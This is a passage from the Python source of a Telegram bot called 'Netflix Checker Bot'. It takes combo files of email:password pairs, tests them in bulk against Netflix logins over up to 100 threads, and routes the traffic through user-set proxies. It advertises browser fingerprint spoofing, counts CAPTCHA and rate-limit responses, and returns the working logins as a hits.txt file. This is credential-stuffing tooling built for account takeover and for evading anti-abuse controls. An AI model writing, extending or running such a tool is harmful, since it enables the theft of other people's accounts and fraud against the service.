        f"✅ <b>Check Complete!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 <b>Total:</b> {c_final['total']}\n"
        f"✅ <b>Hits:</b> {c_final['hit']}\n"
        f"❌ <b>Fails:</b> {c_final['fail']}\n"
        f"🟡 <b>Custom:</b> {c_final['custom']}\n"
        f"🔒 <b>Locked:</b> {c_final['locked']}\n"
        f"⚠️ <b>Rate Limited:</b> {c_final['rate_limited']}\n"
        f"🤖 <b>CAPTCHA:</b> {c_final['captcha']}\n"
        f"🚫 <b>Banned:</b> {c_final['ban']}\n"
        f"💥 <b>Errors:</b> {c_final['error']}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    try:
        bot.edit_message_text(summary, chat_id, msg_id, parse_mode="HTML")
    except Exception:
        bot.send_message(chat_id, summary, parse_mode="HTML")

    if hits_buf:
        hits_text = "\n".join(hits_buf)
        bot.send_document(
            chat_id,
            io.BytesIO(hits_text.encode()),
            visible_file_name="hits.txt",
            caption=f"🎯 {len(hits_buf)} hit(s) saved"
        )

    with active_jobs_lock:
        active_jobs.pop(chat_id, None)


@bot.message_handler(commands=["start", "help"])
def cmd_start(msg: Message):
    text = (
        "🎬 <b>Netflix Checker Bot</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<b>Commands:</b>\n"
        "📄 <b>Send a .txt file</b> — combo file (email:pass per line)\n\n"
        "/check <code>email:pass</code> — single account check\n"
        "/setproxy <code>ip:port:user:pass</code> — set proxy\n"
        "/clearproxy — remove proxy\n"
        "/threads <code>N</code> — set thread count\n"
        "/status — show current settings\n"
        "/stop — stop active job\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Powered by <b>curl_cffi</b> real browser fingerprints"
    )
    bot.send_message(msg.chat.id, text, parse_mode="HTML")


@bot.message_handler(commands=["status"])
def cmd_status(msg: Message):
    s = get_settings(msg.from_user.id)
    proxy_display = s["proxy"] if s["proxy"] else "None (direct)"
    with active_jobs_lock:
        running = msg.chat.id in active_jobs
    text = (
        f"⚙️ <b>Your Settings</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>Proxy:</b> <code>{proxy_display}</code>\n"
        f"🧵 <b>Threads:</b> {s['threads']}\n"
        f"🏃 <b>Job running:</b> {'Yes' if running else 'No'}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(msg.chat.id, text, parse_mode="HTML")


@bot.message_handler(commands=["setproxy"])
def cmd_setproxy(msg: Message):
    parts = msg.text.strip().split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        bot.send_message(msg.chat.id,
            "❌ Usage:\n<code>/setproxy ip:port:user:pass</code>\nor\n<code>/setproxy ip:port</code>",
            parse_mode="HTML")
        return
    raw = parts[1].strip()
    parsed = parse_proxy(raw)
    if not parsed:
        bot.send_message(msg.chat.id, "❌ Could not parse that proxy format.\n\nSupported formats:\n<code>ip:port</code>\n<code>ip:port:user:pass</code>\n<code>http://user:pass@ip:port</code>", parse_mode="HTML")
        return
    wait = bot.send_message(msg.chat.id, "🔄 Validating proxy...", parse_mode="HTML")

    def do_validate():
        ok, info = validate_proxy(raw)
        if ok:
            set_setting(msg.from_user.id, "proxy", raw)
            text = (
                f"✅ <b>Proxy valid &amp; saved!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 <b>Exit IP:</b> <code>{info}</code>\n"
                f"🔗 <b>URL:</b> <code>{parsed}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━"
            )
        else:
            text = (
                f"❌ <b>Proxy failed validation</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{info}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Proxy was <b>not</b> saved. Fix it and try again."
            )
        try:
            bot.edit_message_text(text, msg.chat.id, wait.message_id, parse_mode="HTML")
        except Exception:
            bot.send_message(msg.chat.id, text, parse_mode="HTML")

    threading.Thread(target=do_validate, daemon=True).start()


@bot.message_handler(commands=["clearproxy"])
def cmd_clearproxy(msg: Message):
    set_setting(msg.from_user.id, "proxy", None)
    bot.send_message(msg.chat.id, "✅ Proxy cleared. Using direct connection.")


@bot.message_handler(commands=["threads"])
def cmd_threads(msg: Message):
    parts = msg.text.strip().split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip().isdigit():
        bot.send_message(msg.chat.id, "❌ Usage: <code>/threads 20</code>", parse_mode="HTML")
        return
    n = int(parts[1].strip())
    if n < 1 or n > 100:
        bot.send_message(msg.chat.id, "❌ Threads must be between 1 and 100.")
        return
    set_setting(msg.from_user.id, "threads", n)
    bot.send_message(msg.chat.id, f"✅ Threads set to <b>{n}</b>.", parse_mode="HTML")


@bot.message_handler(commands=["stop"])
def cmd_stop(msg: Message):
    with active_jobs_lock:
        if msg.chat.id in active_jobs:
            active_jobs[msg.chat.id] = "stop"
            bot.send_message(msg.chat.id, "🛑 Stop signal sent. Current batch will finish then halt.")
        else:
            bot.send_message(msg.chat.id, "ℹ️ No active job to stop.")


@bot.message_handler(commands=["check"])
def cmd_check(msg: Message):
    parts = msg.text.strip().split(maxsplit=1)
    if len(parts) < 2 or ":" not in parts[1]:
        bot.send_message(msg.chat.id, "❌ Usage: <code>/check email:password</code>", parse_mode="HTML")
        return
    combo = parts[1].strip()
    email, password = combo.split(":", 1)
    s = get_settings(msg.from_user.id)
    wait_msg = bot.send_message(msg.chat.id, f"🔍 Checking <code>{email}</code>...", parse_mode="HTML")

    def do():
        try:
            result = check_account(email.strip(), password.strip(), s["proxy"])
        except Exception as e:
            result = {"status": "ERROR", "message": str(e), "email": email}
        status = result.get("status", "UNKNOWN").upper()
        if status == "HIT":
            text = fmt_hit(result, password.strip())
        elif status == "CUSTOM":
            text = fmt_hit(result, password.strip()).replace("✅ <b>HIT</b>", "🟡 <b>CUSTOM</b>")
        elif status == "FAIL":
            text = f"❌ <b>FAIL</b>\n<code>{email}:{password}</code>\n{result.get('message','Wrong password')}"
        elif status == "LOCKED":
            text = f"🔒 <b>LOCKED</b>\n<code>{email}:{password}</code>\n{result.get('message','')}"
        elif status == "RATE_LIMITED":
            text = f"⚠️ <b>RATE LIMITED</b>\n<code>{email}:{password}</code>\n{result.get('message','')}"
        elif status == "CAPTCHA":
            text = f"🤖 <b>CAPTCHA</b>\n<code>{email}:{password}</code>\n{result.get('message','')}"
        elif status == "BAN":
            text = f"🚫 <b>BAN</b>\n<code>{email}:{password}</code>\n{result.get('message','')}"
        else:
            text = f"❓ <b>{status}</b>\n<code>{email}:{password}</code>\n{result.get('message','')}"
        try:
            bot.edit_message_text(text, msg.chat.id, wait_msg.message_id, parse_mode="HTML")
        except Exception:
            bot.send_message(msg.chat.id, text, parse_mode="HTML")

    threading.Thread(target=do, daemon=True).start()


@bot.message_handler(content_types=["document"])
def handle_file(msg: Message):
    doc = msg.document
    if not doc.file_name.endswith(".txt"):
        bot.send_message(msg.chat.id, "❌ Please send a <b>.txt</b> combo file.", parse_mode="HTML")
        return

    with active_jobs_lock:
        if msg.chat.id in active_jobs:
            bot.send_message(msg.chat.id, "⚠️ A job is already running. Use /stop first.")
            return
        active_jobs[msg.chat.id] = "running"

    s = get_settings(msg.from_user.id)
    bot.send_message(msg.chat.id, "📥 Downloading combo file...")

    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ Failed to download file: {e}")
        with active_jobs_lock:
            active_jobs.pop(msg.chat.id, None)
        return

    combos = []
    for line in downloaded.decode("utf-8", errors="ignore").splitlines():
        line = line.strip()
        if line and ":" in line and not line.startswith("#"):
            email, password = line.split(":", 1)
            combos.append((email.strip(), password.strip()))

    if not combos:
        bot.send_message(msg.chat.id, "❌ No valid combos found. Format: <code>email:password</code>", parse_mode="HTML")
        with active_jobs_lock:
            active_jobs.pop(msg.chat.id, None)
        return

    if s["proxy"]:
        val_msg = bot.send_message(msg.chat.id, "🔄 Validating proxy before starting...", parse_mode="HTML")
        ok, info = validate_proxy(s["proxy"])
        if ok:
            try:
                bot.edit_message_text(f"✅ Proxy OK — exit IP: <code>{info}</code>", msg.chat.id, val_msg.message_id, parse_mode="HTML")
            except Exception:
                pass
        else:
            try:
                bot.edit_message_text(
                    f"❌ <b>Proxy validation failed:</b>\n<code>{info}</code>\n\nUse /clearproxy to go direct or /setproxy to fix it.",
                    msg.chat.id, val_msg.message_id, parse_mode="HTML"
                )
            except Exception:
                pass
            with active_jobs_lock:
                active_jobs.pop(msg.chat.id, None)
            return

    proxy_display = s["proxy"] if s["proxy"] else "None (direct)"
    bot.send_message(
        msg.chat.id,
        f"🚀 <b>Starting check</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 Combos: <b>{len(combos)}</b>\n"
        f"🧵 Threads: <b>{s['threads']}</b>\n"
        f"🌐 Proxy: <code>{proxy_display}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML"
    )

    threading.Thread(
        target=run_bulk_check,
        args=(msg.chat.id, combos, s["proxy"], s["threads"]),
        daemon=True
    ).start()


if __name__ == "__main__":
    print(f"[+] Bot started. Polling...")
    bot.infinity_polling(timeout=30, long_polling_timeout=20)
